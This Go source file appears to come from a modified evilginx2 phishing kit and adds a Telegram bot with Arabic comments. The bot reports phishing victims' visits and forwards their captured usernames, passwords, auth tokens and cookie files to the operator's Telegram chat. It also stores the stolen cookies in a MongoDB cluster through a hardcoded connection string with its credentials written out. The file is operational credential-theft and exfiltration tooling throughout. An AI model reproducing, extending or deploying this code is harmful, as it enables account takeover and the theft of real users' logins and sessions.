package core

import (
	"fmt"
	"net/http"
	"net/url"
	"io/ioutil"
	"strings"
	"time"
	"bytes"
	"mime/multipart"

	"github.com/kgretzky/evilginx2/log"

	"encoding/json"
	"context"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
	"go.mongodb.org/mongo-driver/bson/primitive"
)

type TelegramBot struct {
	Token     string
	ChatID    string
	Enabled   bool
	Client    *http.Client
}

// NewTelegramBot ينشئ كائن جديد من بوت تليجرام
func NewTelegramBot(token string, chatID string) *TelegramBot {
	enabled := token != "" && chatID != ""
	if enabled {
		tokenPreview := ""
		if len(token) > 8 {
			tokenPreview = token[:8] + "****"
		} else {
			tokenPreview = "****"
		}
		log.Info("تم تفعيل بوت تليجرام - التوكن: %s - معرف المحادثة: %s", tokenPreview, chatID)
	}
	
	return &TelegramBot{
		Token:    token,
		ChatID:   chatID,
		Enabled:  enabled,
		Client:   &http.Client{},
	}
}

// GetCountryFromIP يجلب معلومات البلد من عنوان IP باستخدام خدمة ipinfo.io
func (t *TelegramBot) GetCountryFromIP(ipAddress string) string {
	if ipAddress == "127.0.0.1" || strings.HasPrefix(ipAddress, "192.168.") || strings.HasPrefix(ipAddress, "10.") {
		return "Local"
	}

	url := "https://ipinfo.io/" + ipAddress + "/json"
	resp, err := http.Get(url)
	if err != nil {
		log.Warning("فشل في الحصول على معلومات البلد: %v", err)
		return "Unknown"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Warning("فشل في قراءة استجابة ipinfo: %v", err)
		return "Unknown"
	}

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Warning("فشل في تحليل استجابة ipinfo: %v", err)
		return "Unknown"
	}

	if country, ok := result["country"].(string); ok {
		return country
	}

	return "Unknown"
}

// SendMessage يرسل رسالة إلى التشات المحدد
func (t *TelegramBot) SendMessage(message string) error {
	if !t.Enabled {
		return nil
	}

	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
	data := url.Values{}
	data.Set("chat_id", t.ChatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")

	// محاولة إرسال الرسالة ثلاث مرات في حالة الفشل
	var lastErr error
	for i := 0; i < 3; i++ {
		if i > 0 {
			log.Warning("محاولة إعادة إرسال الرسالة... محاولة %d من 3", i+1)
			// إضافة تأخير قبل إعادة المحاولة
			time.Sleep(time.Duration(2*i) * time.Second)
		}

		req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في إنشاء طلب: %v", err)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// إضافة timeout للطلب
		client := &http.Client{
			Timeout: 10 * time.Second,
		}

		resp, err := client.Do(req)
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في إرسال الرسالة: %v", err)
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في قراءة الاستجابة: %v", err)
			continue
		}

		var result map[string]interface{}
		err = json.Unmarshal(body, &result)
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في تحليل استجابة تليجرام: %v", err)
			continue
		}

		ok, exists := result["ok"].(bool)
		if !exists || !ok {
			lastErr = fmt.Errorf("استجابة خاطئة من تليجرام: %s", string(body))
			log.Error("telegram: %v", lastErr)
			continue
		}

		log.Debug("telegram: تم إرسال الرسالة بنجاح")
		return nil // نجاح
	}

	return lastErr // إرجاع آخر خطأ حصل
}

// NotifyNewVisit يرسل إشعارًا بزيارة جديدة
func (t *TelegramBot) NotifyNewVisit(sessionID string, phishlet string, ipAddress string, userAgent string) error {
	if !t.Enabled {
		return nil
	}

	country := t.GetCountryFromIP(ipAddress)

	message := fmt.Sprintf(
		"🔔 <b>New Visit</b>\n\n"+
		"🌐 <b>Phishlet:</b> %s\n"+
		"🆔 <b>Session ID:</b> %s\n"+
		"🌍 <b>Country:</b> %s\n"+
		"🖥 <b>IP Address:</b> %s\n"+
		"📱 <b>User Agent:</b> %s",
		phishlet, sessionID, country, ipAddress, userAgent,
	)

	return t.SendMessage(message)
}

// NotifyCredentialsCaptured يرسل إشعارًا عند التقاط بيانات الاعتماد
func (t *TelegramBot) NotifyCredentialsCaptured(sessionID string, phishlet string, username string, password string, ipAddress string) error {
	if !t.Enabled {
		return nil
	}

	country := t.GetCountryFromIP(ipAddress)

	message := fmt.Sprintf(
		"🎣 <b>Credentials Captured</b>\n\n"+
		"🌐 <b>Phishlet:</b> %s\n"+
		"🆔 <b>Session ID:</b> %s\n"+
		"👤 <b>Username:</b> %s\n"+
		"🔑 <b>Password:</b> %s\n"+
		"🌍 <b>Country:</b> %s\n"+
		"🖥 <b>IP Address:</b> %s",
		phishlet, sessionID, username, password, country, ipAddress,
	)

	return t.SendMessage(message)
}

// NotifyTokensCaptured يرسل إشعارًا عند التقاط الرموز
func (t *TelegramBot) NotifyTokensCaptured(sessionID string, phishlet string, ipAddress string) error {
	if !t.Enabled {
		return nil
	}

	country := t.GetCountryFromIP(ipAddress)

	message := fmt.Sprintf(
		"🔐 <b>Tokens Captured</b>\n\n"+
		"🌐 <b>Phishlet:</b> %s\n"+
		"🆔 <b>Session ID:</b> %s\n"+
		"🌍 <b>Country:</b> %s\n"+
		"🖥 <b>IP Address:</b> %s",
		phishlet, sessionID, country, ipAddress,
	)

	return t.SendMessage(message)
}

// نوع بيانات لتمثيل زر مدمج في تيليجرام
type InlineKeyboardButton struct {
	Text         string `json:"text"`
	CallbackData string `json:"callback_data,omitempty"`
}

// نوع بيانات لتمثيل لوحة مفاتيح مدمجة
type InlineKeyboardMarkup struct {
	InlineKeyboard [][]InlineKeyboardButton `json:"inline_keyboard"`
}

// SendMessageWithButtons يرسل رسالة مع أزرار مدمجة
func (t *TelegramBot) SendMessageWithButtons(message string, buttons [][]InlineKeyboardButton) (string, error) {
	if !t.Enabled {
		return "", nil
	}

	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
	
	// إنشاء بيانات لوحة المفاتيح المدمجة
	markup := InlineKeyboardMarkup{
		InlineKeyboard: buttons,
	}
	
	// تحويل لوحة المفاتيح إلى JSON
	markupJSON, err := json.Marshal(markup)
	if err != nil {
		return "", fmt.Errorf("فشل في تحويل الأزرار إلى JSON: %v", err)
	}
	
	// إنشاء بيانات الطلب
	data := url.Values{}
	data.Set("chat_id", t.ChatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")
	data.Set("reply_markup", string(markupJSON))

	// إنشاء وإرسال الطلب
	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
	if err != nil {
		return "", fmt.Errorf("فشل في إنشاء طلب: %v", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// إضافة timeout للطلب
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("فشل في إرسال الرسالة: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("فشل في قراءة الاستجابة: %v", err)
	}

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		return "", fmt.Errorf("فشل في تحليل استجابة تليجرام: %v", err)
	}

	ok, exists := result["ok"].(bool)
	if !exists || !ok {
		return "", fmt.Errorf("استجابة خاطئة من تليجرام: %s", string(body))
	}

	// استخراج معرف الرسالة المرسلة
	var messageID string
	if resultObj, exists := result["result"].(map[string]interface{}); exists {
		if msgID, exists := resultObj["message_id"].(float64); exists {
			messageID = fmt.Sprintf("%.0f", msgID)
		}
	}

	log.Debug("telegram: تم إرسال الرسالة مع الأزرار بنجاح، معرف الرسالة: %s", messageID)
	return messageID, nil
}

// EditMessage يقوم بتعديل رسالة موجودة
func (t *TelegramBot) EditMessage(messageID string, newText string) error {
	if !t.Enabled || messageID == "" {
		return nil
	}

	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageText", t.Token)
	
	data := url.Values{}
	data.Set("chat_id", t.ChatID)
	data.Set("message_id", messageID)
	data.Set("text", newText)
	data.Set("parse_mode", "HTML")

	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
	if err != nil {
		return fmt.Errorf("فشل في إنشاء طلب لتعديل الرسالة: %v", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("فشل في تعديل الرسالة: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("فشل في قراءة الاستجابة: %v", err)
	}

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		return fmt.Errorf("فشل في تحليل استجابة تيليجرام: %v", err)
	}

	ok, exists := result["ok"].(bool)
	if !exists || !ok {
		return fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
	}

	log.Debug("telegram: تم تعديل الرسالة بنجاح، معرف الرسالة: %s", messageID)
	return nil
}

// SendLoginApprovalRequest يرسل طلب موافقة لتسجيل الدخول مع أزرار
func (t *TelegramBot) SendLoginApprovalRequest(sessionID string, authToken string, ipAddress string, userAgent string) (string, error) {
	if !t.Enabled {
		return "", nil
	}

	country := t.GetCountryFromIP(ipAddress)

	// إنشاء نص الرسالة
	message := fmt.Sprintf(
		"🔐 <b>New Login Request</b>\n\n"+
			"🆔 <b>Session ID:</b> %s\n"+
			"🔑 <b>Auth Token:</b> %s\n"+
			"🌍 <b>Country:</b> %s\n"+
			"🖥️ <b>IP Address:</b> %s\n"+
			"📱 <b>User Agent:</b> %s\n\n"+
			"<b>Do you want to approve this login request?</b>",
		sessionID, authToken, country, ipAddress, userAgent,
	)

	// إنشاء أزرار الموافقة والرفض
	buttons := [][]InlineKeyboardButton{
		{
			{
				Text:         "✅ Approve",
				CallbackData: fmt.Sprintf("approve:%s:%s", sessionID, authToken),
			},
			{
				Text:         "❌ Reject",
				CallbackData: fmt.Sprintf("reject:%s", sessionID),
			},
		},
	}

	// إرسال الرسالة مع الأزرار
	return t.SendMessageWithButtons(message, buttons)
}

// StartPolling يبدأ استطلاع تحديثات البوت
func (t *TelegramBot) StartPolling(callback func(string, string)) {
	if !t.Enabled {
		log.Warning("لا يمكن بدء الاستطلاع: بوت تيليجرام غير مفعل")
		return
	}

	log.Info("بدء استطلاع تحديثات بوت تيليجرام...")
	
	// استخدام offset للحصول على تحديثات جديدة فقط
	offset := 0
	
	// بدء الاستطلاع في مؤشر ترابط منفصل
	go func() {
		for {
			// استطلاع التحديثات
			updates, err := t.getUpdates(offset)
			if err != nil {
				log.Error("فشل في الحصول على تحديثات التيليجرام: %v", err)
				time.Sleep(5 * time.Second)
				continue
			}
			
			// معالجة التحديثات
			for _, update := range updates {
				// تحديث offset ليشير إلى التحديث التالي
				updateID := int(update["update_id"].(float64))
				offset = updateID + 1
				
				// البحث عن بيانات الاستدعاء (callback data)
				if callbackQuery, ok := update["callback_query"].(map[string]interface{}); ok {
					data, ok := callbackQuery["data"].(string)
					if ok {
						// تقسيم البيانات إلى أجزاء
						parts := strings.Split(data, ":")
						if len(parts) >= 2 {
							action := parts[0]
							sessionID := parts[1]
							
							// استخراج توكن المصادقة إذا كان موجودًا
							authToken := ""
							if action == "approve" && len(parts) >= 3 {
								authToken = parts[2]
							}
							
							// استدعاء الدالة المرجعية مع البيانات
							go func(action, sessionID, authToken string) {
								// تأكيد استلام الاستدعاء
								t.answerCallbackQuery(callbackQuery["id"].(string), fmt.Sprintf("Action: %s", action))
								
								// استدعاء المعالج المسجل
								callback(action, sessionID)
							}(action, sessionID, authToken)
						}
					}
				}
			}
			
			// انتظار قبل الاستطلاع التالي
			time.Sleep(1 * time.Second)
		}
	}()
}

// getUpdates يحصل على تحديثات البوت
func (t *TelegramBot) getUpdates(offset int) ([]map[string]interface{}, error) {
	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates", t.Token)
	
	data := url.Values{}
	data.Set("offset", fmt.Sprintf("%d", offset))
	data.Set("timeout", "30")
	
	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, fmt.Errorf("فشل في إنشاء طلب تحديثات: %v", err)
	}
	
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	
	client := &http.Client{
		Timeout: 35 * time.Second,
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("فشل في الحصول على التحديثات: %v", err)
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("فشل في قراءة استجابة التحديثات: %v", err)
	}
	
	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		return nil, fmt.Errorf("فشل في تحليل استجابة التحديثات: %v", err)
	}
	
	ok, exists := result["ok"].(bool)
	if !exists || !ok {
		return nil, fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
	}
	
	updates, ok := result["result"].([]interface{})
	if !ok {
		return []map[string]interface{}{}, nil
	}
	
	var updatesMap []map[string]interface{}
	for _, update := range updates {
		if updateMap, ok := update.(map[string]interface{}); ok {
			updatesMap = append(updatesMap, updateMap)
		}
	}
	
	return updatesMap, nil
}

// answerCallbackQuery يؤكد استلام استدعاء من زر مدمج
func (t *TelegramBot) answerCallbackQuery(callbackQueryID string, text string) error {
	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/answerCallbackQuery", t.Token)
	
	data := url.Values{}
	data.Set("callback_query_id", callbackQueryID)
	if text != "" {
		data.Set("text", text)
		data.Set("show_alert", "true")
	}
	
	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
	if err != nil {
		return fmt.Errorf("فشل في إنشاء طلب تأكيد الاستدعاء: %v", err)
	}
	
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("فشل في تأكيد الاستدعاء: %v", err)
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("فشل في قراءة استجابة تأكيد الاستدعاء: %v", err)
	}
	
	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		return fmt.Errorf("فشل في تحليل استجابة تأكيد الاستدعاء: %v", err)
	}
	
	ok, exists := result["ok"].(bool)
	if !exists || !ok {
		return fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
	}
	
	return nil
}

// دالة جديدة لإرسال ملف نصي إلى تلجرام
func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) error {
	if !t.Enabled {
		return fmt.Errorf("telegram bot is disabled")
	}
	
	// استخدام API تلجرام لإرسال ملفات
	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.Token)
	
	// إنشاء حدود متعددة الأجزاء لإرسال الملف
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	
	// إضافة معرف الدردشة
	_ = writer.WriteField("chat_id", t.ChatID)
	
	// إضافة تعليق للملف
	_ = writer.WriteField("caption", "Captured cookies and tokens")
	
	// إنشاء جزء الملف
	part, err := writer.CreateFormFile("document", fileName)
	if err != nil {
		return fmt.Errorf("error creating form file: %v", err)
	}
	
	// كتابة محتوى الملف
	_, err = part.Write([]byte(fileContent))
	if err != nil {
		return fmt.Errorf("error writing file content: %v", err)
	}
	
	// إغلاق الكاتب
	err = writer.Close()
	if err != nil {
		return fmt.Errorf("error closing writer: %v", err)
	}
	
	// إنشاء طلب HTTP
	req, err := http.NewRequest("POST", apiUrl, body)
	if err != nil {
		return fmt.Errorf("error creating request: %v", err)
	}
	
	// تعيين نوع المحتوى
	req.Header.Set("Content-Type", writer.FormDataContentType())
	
	// إرسال الطلب
	resp, err := t.Client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()
	
	// التحقق من نجاح الطلب
	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s", string(bodyBytes))
	}
	
	log.Success("Cookies file sent to Telegram successfully")

	// استخراج معرف الجلسة من اسم الملف
	sessionID := "default"
	if strings.Contains(fileName, "_") {
		parts := strings.Split(fileName, "_")
		if len(parts) > 1 {
			sessionPart := parts[len(parts)-1]
			sessionID = strings.TrimSuffix(sessionPart, ".txt")
		}
	}
	
	t.SendCookiesFile(sessionID, fileContent)
	return nil
}

func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
	
	log.Info("جاري تحديث الكوكيز للجلسة: %s", sessionID)
	
	// استخدام MongoDB مباشرة لتحديث الكوكيز
	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
	db_name := "evilginx"

	// الاتصال بقاعدة البيانات
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	client, err := mongo.Connect(ctx, options.Client().ApplyURI(mongo_uri))
	if err != nil {
		log.Error("فشل في الاتصال بـ MongoDB: %v", err)
		return err
	}
	defer client.Disconnect(ctx)

	// تحليل JSON مباشرة من محتوى الملف
	var cookiesList []map[string]interface{}
	err = json.Unmarshal([]byte(fileContent), &cookiesList)
	if err != nil {
		log.Error("فشل في تحليل JSON الكوكيز: %v", err)
		return err
	}
	
	log.Success("تم استخراج %d كوكيز من الملف", len(cookiesList))
	
	// تحديث الجلسة في قاعدة البيانات
	collection := client.Database(db_name).Collection("sessions")
	filter := bson.M{"session_id": sessionID}
	update := bson.M{
		"$set": bson.M{
			"cookies": cookiesList,
			"update_time": time.Now().UTC().Unix(),
		},
	}
	
	// استخدام FindOneAndUpdate بدلاً من UpdateOne
	var session bson.M
	opts := options.FindOneAndUpdate().SetReturnDocument(options.After)
	err = collection.FindOneAndUpdate(ctx, filter, update, opts).Decode(&session)
	
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Warning("لم يتم العثور على الجلسة المحددة: %s", sessionID)
		} else {
			log.Error("فشل في تحديث الكوكيز في MongoDB: %v", err)
		}
		return err
	}
	
	// التحقق من وجود الكوكيز في الوثيقة المحدثة
	if cookies, exists := session["cookies"]; exists {
		if cookiesArray, ok := cookies.(primitive.A); ok {
			log.Success("تم تحديث الكوكيز في MongoDB بنجاح - عدد الكوكيز: %d", len(cookiesArray))
		} else {
			log.Warning("الكوكيز موجودة ولكن ليست مصفوفة")
		}
	} else {
		log.Warning("لم يتم العثور على حقل الكوكيز في الوثيقة المحدثة")
	}
	
	return nil
}